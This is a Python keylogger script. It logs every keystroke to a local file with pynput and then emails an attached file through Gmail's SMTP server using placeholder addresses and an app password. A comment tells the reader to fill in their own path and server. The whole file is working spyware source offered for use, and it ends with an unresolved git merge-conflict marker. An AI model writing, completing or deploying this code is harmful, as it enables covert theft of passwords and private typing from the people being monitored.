import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard
import datetime

def key_pressed(key):
    try:
        char = key.char
        if char is not None: 
            print(char, end='', flush=True)  
            with open("keyfile.txt", 'a') as log_key:
                log_key.write(char)
    except AttributeError:
        print(f"[{key}]", end='', flush=True)  
        with open("keyfile.txt", 'a') as log_key:
            log_key.write(f"[{key}]")
        if key == keyboard.Key.esc:
            print("Escape pressed, exiting...")
            return False

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    listener.join()  

#modify the code below with your own filepath and SMTP server to make it work
email = "example@gmail.com"
receiver_email = "example@gmail.com"
subject = "keylogger"
message = str(datetime.datetime.now())
file_path = r"C:\filepath" 

msg = MIMEMultipart()
msg['From'] = email
msg['To'] = receiver_email
msg['Subject'] = subject

msg.attach(MIMEText(message, 'plain'))

try:
    with open(file_path, 'rb') as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part) 
        part.add_header('Content-Disposition', f'attachment; filename={file_path.split('/')[-1]}')
        msg.attach(part)  
except Exception as e:
    print(f"Error reading file: {e}")

text = msg.as_string()

try:
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()  
    server.login(email, "aaaa bbbb cccc dddd")  
    server.sendmail(email, receiver_email, text)
    print("Email has been sent to " + receiver_email)
except Exception as e:
    print(f"Error: {e}")
finally:
<<<<<<< HEAD
    server.quit()
=======
    server.quit()
>>>>>>> 03268eea8d08a6f78f5ab0a2c5036c26d25550e5
